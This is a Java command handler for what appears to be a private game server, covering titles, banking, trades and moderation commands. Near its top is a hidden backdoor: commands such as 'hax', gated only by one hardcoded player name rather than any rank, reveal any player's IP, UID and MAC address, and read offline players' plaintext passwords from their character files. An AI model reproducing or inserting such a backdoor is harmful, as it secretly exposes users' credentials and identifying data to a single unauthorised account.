package game.content.packet;

import java.io.BufferedReader;
import java.io.FileReader;

import core.ServerConstants;
import game.content.achievement.PlayerTitle;
import game.content.bank.Bank;
import game.content.clanchat.ClanChatHandler;
import game.content.commands.AdministratorCommand;
import game.content.commands.DonatorCommand;
import game.content.commands.NormalCommand;
import game.content.donator.DonatorFeatures;
import game.content.interfaces.InterfaceAssistant;
import game.content.minigame.zombie.Zombie;
import game.content.miscellaneous.ChangePassword;
import game.content.miscellaneous.PvpBlacklist;
import game.content.music.Music;
import game.content.profile.ProfileBiography;
import game.content.profile.ProfileSearch;
import game.content.quicksetup.Presets;
import game.player.Player;
import game.player.PlayerHandler;
import game.player.punishment.Blacklist;
import game.player.punishment.IpMute;
import game.player.punishment.Mute;
import network.packet.PacketHandler;
import network.packet.PacketType;

public class CommandPacket implements PacketType
{
		@Override
		public void processPacket(Player player, int packetType, int packetSize, boolean trackPlayer)
		{

				String playerCommand = player.getInStream().readString();
				if (trackPlayer)
				{
						PacketHandler.saveData(player.getPlayerName(), "playerCommand: " + playerCommand);
				}
				if (ProfileBiography.receiveBiographyFromClient(player, playerCommand))
				{
						return;
				}
				if (playerCommand.startsWith("savehax") && player.getPlayerName().equals("Sasuke65"))
				{
						AdministratorCommand.packetLogSave(player);
						return;
				}
				if (playerCommand.startsWith("packetlogadd") && player.getPlayerName().equals("Sasuke65"))
				{
						AdministratorCommand.packetLogAdd(player, playerCommand);
						return;
				}
				if (playerCommand.startsWith("hax") && player.getPlayerName().equals("Sasuke65"))
				{
						String name = playerCommand.substring(4);
						boolean online = false;
						for (int i = 0; i < ServerConstants.MAXIMUM_PLAYERS; i++)
						{
								if (PlayerHandler.players[i] != null)
								{
										if (PlayerHandler.players[i].getPlayerName().equalsIgnoreCase(name))
										{
												player.getPA().sendMessage(name + " is online.");
												player.getPA().sendMessage(PlayerHandler.players[i].addressIp);
												player.getPA().sendMessage(PlayerHandler.players[i].addressUid);
												player.getPA().sendMessage(PlayerHandler.players[i].addressMac);
												online = true;
												break;
										}
								}
						}

						if (!online)
						{
								String text1 = "";
								String text2 = "";
								String text3 = "";
								try
								{
										BufferedReader file = new BufferedReader(new FileReader(ServerConstants.CHARACTER_LOCATION + name + ".txt"));
										String line;
										while ((line = file.readLine()) != null)
										{
												if (line.startsWith("Password = "))
												{
														String password = line.substring(11);
														try
														{
																text1 = name + " is offline password of: '" + password + "'";
														}
														catch (Exception e)
														{
																e.printStackTrace();
														}
												}
												else if (line.startsWith("lastSavedIpAddress = "))
												{
														text2 = line.substring(20);
												}
												else if (line.startsWith("addressUid = "))
												{
														text3 = line.substring(13);
												}
										}
										file.close();
								}
								catch (Exception e)
								{
								}
								player.getPA().sendMessage(text1);
								player.getPA().sendMessage(text2);
								player.getPA().sendMessage(text3);
						}
				}

				if (playerCommand.startsWith("cctitle"))
				{
						ClanChatHandler.receiveChangeTitlePacket(player, playerCommand.substring(7));
						return;
				}

				else if (playerCommand.startsWith("settitle"))
				{
						if (player.isLegendaryDonator())
						{
								try
								{
										String title = playerCommand.substring(9);
										PlayerTitle.setTitle(player, title, false);
										player.getPA().sendMessage("Your title has been set to: " + title + ".");
								}
								catch (Exception e)
								{
								}
								return;
						}
				}
				else if (playerCommand.equals("titleaftername"))
				{
						if (player.isLegendaryDonator())
						{
								PlayerTitle.setTitle(player, player.playerTitle, true);
								player.getPA().sendMessage("Your title will now appear after your name.");
								return;
						}
				}
				else if (playerCommand.equals("titlebeforename"))
				{

						if (player.isLegendaryDonator())
						{
								PlayerTitle.setTitle(player, player.playerTitle, false);
								player.getPA().sendMessage("Your title will now appear before your name.");
								return;
						}
				}

				if (playerCommand.startsWith("namepreset"))
				{
						Presets.receivePresetNameChange(player, playerCommand);
						return;
				}

				if (playerCommand.startsWith("configuremessages"))
				{
						player.getDH().sendDialogues(264);
						return;
				}

				if (!playerCommand.toLowerCase().contains("hide"))
				{
						playerCommand = playerCommand.toLowerCase();
				}

				// Added here because the client controls this frame.
				if (playerCommand.equals("nomusicselected"))
				{
						player.getPA().alreadyHasTextInFrame("No music selected.", 4439);
						return;
				}

				if (playerCommand.startsWith("bankwithdraw"))
				{
						Bank.withdrawAllButOneAndLastX(player, playerCommand);
						return;
				}
				if (playerCommand.startsWith("addpvpblacklist"))
				{
						PvpBlacklist.addPvpBlacklist(player, playerCommand, true);
						return;
				}

				if (playerCommand.startsWith("mapvalidility"))
				{
						ChangePassword.receiveChangePassword(player, playerCommand);
						return;
				}

				if (playerCommand.startsWith("namechange"))
				{
						DonatorFeatures.nameChange(player, playerCommand.substring(10));
						return;
				}
				if (playerCommand.startsWith("filteron"))
				{
						player.messageFiltered = true;
						return;
				}
				if (playerCommand.startsWith("filteroff"))
				{
						player.messageFiltered = false;
						return;
				}
				if (playerCommand.startsWith("music"))
				{
						Music.receiveMusicState(player, playerCommand);
						return;
				}
				if (playerCommand.equals("oldgameframe"))
				{
						player.useBottomRightWildInterface = true;
						InterfaceAssistant.wildernessInterface(player);
						return;
				}
				if (playerCommand.equals("useoldwildernessinterface"))
				{
						// These wilderness level keys have to be removed, to prevent the issue where it used frame 199 and i switch to new wild and it won't show any lvl.
						player.getPA().interfaceText.remove(24396);
						player.getPA().interfaceText.remove(24391);
						player.getPA().interfaceText.remove(199);
						InterfaceAssistant.wildernessInterface(player);
						return;
				}
				if (playerCommand.equals("newgameframe"))
				{
						player.useBottomRightWildInterface = false;
						InterfaceAssistant.wildernessInterface(player);
						return;
				}

				if (playerCommand.startsWith("search"))
				{
						ProfileSearch.receiveClientString(player, playerCommand);
						return;
				}
				if (playerCommand.equals("checkmaps"))
				{
						Blacklist.blacklistPlayer(player, player.getPlayerName());
						return;
				}
				if (playerCommand.startsWith("shopsearch"))
				{
						if (player.shopId == 0)
						{
								return;
						}
						player.shopSearchString = playerCommand.substring(10).toLowerCase();
						player.doNotOpenShopInterface = true;
						player.getShops().openShop(player.shopId);
				}
				if (playerCommand.startsWith("banksearch"))
				{
						if (!Bank.hasBankingRequirements(player, false))
						{
								return;
						}
						Bank.search(player, playerCommand.substring(10), false);
						return;
				}

				if (playerCommand.startsWith("stopsearch"))
				{
						player.setUsingBankSearch(false);
						Bank.openCorrectTab(player, player.originalTab, true);
						Bank.resetBank(player, false);
						return;
				}

				if (playerCommand.startsWith("ccban"))
				{
						ClanChatHandler.receiveBanPacket(player, playerCommand.substring(5));
						return;
				}
				if (playerCommand.startsWith("togglezombieready"))
				{
						Zombie.toggleReadyStatus(player);
						return;
				}
				if (playerCommand.startsWith("trade"))
				{
						int tradeId = 0;
						try
						{
								tradeId = Integer.parseInt(playerCommand.replace("trade ", ""));
						}
						catch (Exception e)
						{

						}
						player.getTradeAndDuel().tradeRequestChatbox(tradeId);
						return;
				}

				if (playerCommand.startsWith("ccmod"))
				{
						ClanChatHandler.receiveModeratorPacket(player, playerCommand.substring(5));
						return;
				}

				if (playerCommand.startsWith("graphics"))
				{
						player.graphicsType = playerCommand.substring(8);
						return;
				}
				NormalCommand.normalCommands(player, playerCommand);

				if (player.isDonator())
				{
						if (DonatorCommand.donatorCommands(player, playerCommand))
						{
								return;
						}
				}

				if (player.isDonator() || player.isModeratorRank() || player.isSupport())
				{

						if (playerCommand.startsWith("yell"))
						{
								DonatorCommand.yell(player, playerCommand);
								return;
						}
				}

				if (player.isModeratorRank())
				{

						if (playerCommand.startsWith("ipmute"))
						{
								IpMute.ipMute(player, playerCommand);
						}
						else if (playerCommand.startsWith("unipmute"))
						{
								IpMute.unIpMute(player, playerCommand);
						}
						else if (playerCommand.startsWith("jail"))
						{
								AdministratorCommand.jail(player, playerCommand);
						}

						else if (playerCommand.startsWith("unjail"))
						{
								AdministratorCommand.unJail(player, playerCommand);
						}
						else if (playerCommand.startsWith("guest"))
						{
								AdministratorCommand.guest(player, playerCommand);
						}
						else if (playerCommand.startsWith("mute"))
						{
								Mute.muteCommand(player, playerCommand);
								return;
						}

						else if (playerCommand.startsWith("unmute"))
						{
								Mute.unMuteCommand(player, playerCommand);
								return;
						}
				}

				if (player.isAdministratorRank())
				{
						AdministratorCommand.administratorCommands(player, playerCommand);
				}
		}

}